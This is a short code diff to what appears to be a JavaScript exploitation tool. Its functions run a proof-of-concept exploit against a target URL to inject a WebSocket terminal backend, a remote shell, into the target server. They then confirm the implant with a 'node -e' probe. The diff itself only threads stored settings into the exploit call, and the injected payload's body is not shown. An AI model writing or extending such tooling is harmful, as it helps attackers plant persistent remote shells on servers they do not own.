@@ -1,4 +1,5 @@
 import { executePOC } from './poc-handler.js'
+import { loadSettings } from './storage-handler.js'
 
 /**
  * 生成要注入的终端后端代码
@@ -33,7 +34,11 @@ export async function injectTerminalBackend(
     console.log('WebSocket 路径:', wsPath)
     console.log('注入命令长度:', command.length)
 
-    const result = await executePOC(targetUrl, command)
+    // 加载设置
+    const settingsResult = await loadSettings()
+    const settings = settingsResult.success ? settingsResult.settings : null
+
+    const result = await executePOC(targetUrl, command, settings)
 
     console.log('POC 执行结果:', {
       is_vulnerable: result.is_vulnerable,
@@ -83,7 +88,12 @@ export async function testTerminalBackend(targetUrl) {
     // 使用 node -e 来执行 JavaScript 代码
     const checkCommand =
       "node -e \"console.log(typeof global.__terminalBackendInjected !== 'undefined' ? 'INJECTED:' + global.__terminalBackendPath : 'NOT_INJECTED')\""
-    const result = await executePOC(targetUrl, checkCommand)
+
+    // 加载设置
+    const settingsResult = await loadSettings()
+    const settings = settingsResult.success ? settingsResult.settings : null
+
+    const result = await executePOC(targetUrl, checkCommand, settings)
 
     console.log('后端测试结果:', result.digest_content)
 
